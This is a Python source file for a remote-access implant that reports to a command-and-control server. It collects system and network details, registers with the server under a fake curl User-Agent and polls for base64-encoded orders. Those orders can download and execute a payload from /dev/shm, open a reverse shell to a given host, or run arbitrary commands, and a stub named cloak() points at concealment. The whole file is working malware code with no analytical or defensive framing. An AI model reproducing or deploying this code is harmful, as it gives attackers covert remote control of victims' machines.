import json
import os
import random
import re
import socket
import subprocess
from base64 import b64encode, b64decode
from json import JSONDecodeError
from time import sleep
from urllib import request

from multiprocessing import Process

c2 = 'http://localhost:5000/'
loc = 'register'
chloc = 'checkin?k='


def cloak():
    pass


def parse_msg(html):
    for line in html.decode().split('\n'):
        if '_csrf_token' in line:
            return re.search('value="(.*)"', line).group(1)


def register() -> str:
    while True:
        try:
            r = request.urlopen(request.Request(c2 + loc, data=b64encode(info.encode()),
                                                headers={'User-Agent': 'curl/7.54.0'}))
        except Exception as e:
            print(e)
            print("Failed, trying again in 60 sec...")
            sleep(random.randint(45, 70))
        else:
            return parse_msg(r.read())


def reverse_shell(conf):
    s = socket.socket(conf.get('inet', 2), conf.get('type', 1))
    i = 0
    while i < 5:
        try:
            s.connect((conf['host'], conf['port']))
            break
        except ConnectionRefusedError:
            sleep(10)
            i += 1
    if i < 5:
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.run(["/bin/sh", "-i"])


def handle_msg(msg):
    msg = b64decode(msg).decode()
    if msg:
        try:
            msg = json.loads(msg)
        except JSONDecodeError:
            pass
        else:
            if msg['cmd'] == 'update':
                print("Updating")
                subprocess.run(['wget', msg['url'], '-O', '/dev/shm/.cache'])
                os.execl('/dev/shm/.cache', '/dev/shm/.cache')
            elif msg['cmd'] == 'reverse':
                print("Reverse shell")
                p = Process(target=reverse_shell, args=(msg,))
                p.start()
                return p
            elif msg['cmd'] == 'exec':
                print("Executing command")
                p = Process(target=subprocess.run, args=(msg,))
                p.start()
                return p
    print("nothing to do")


def check_in():
    try:
        r = request.urlopen(request.Request(c2 + chloc + key, headers={'User-Agent': 'curl/7.54.0'}))
    except Exception as e:
        print(e)
    else:
        handle_msg(parse_msg(r.read()))


def get_info():
    k = subprocess.check_output(['uname', '-a']).decode()
    try:
        i = subprocess.check_output(['ifconfig']).decode()
    except FileNotFoundError:
        i = subprocess.check_output(['/sbin/ifconfig']).decode()
    o = open('/etc/os-release').read()
    u = os.getuid()
    return json.dumps(dict(k=k, i=i, o=o, u=u))


if __name__ == '__main__':
    info = get_info()
    cloak()
    key = register()
    print(key)
    while True:
        check_in()
        sleep(random.randint(45, 75))
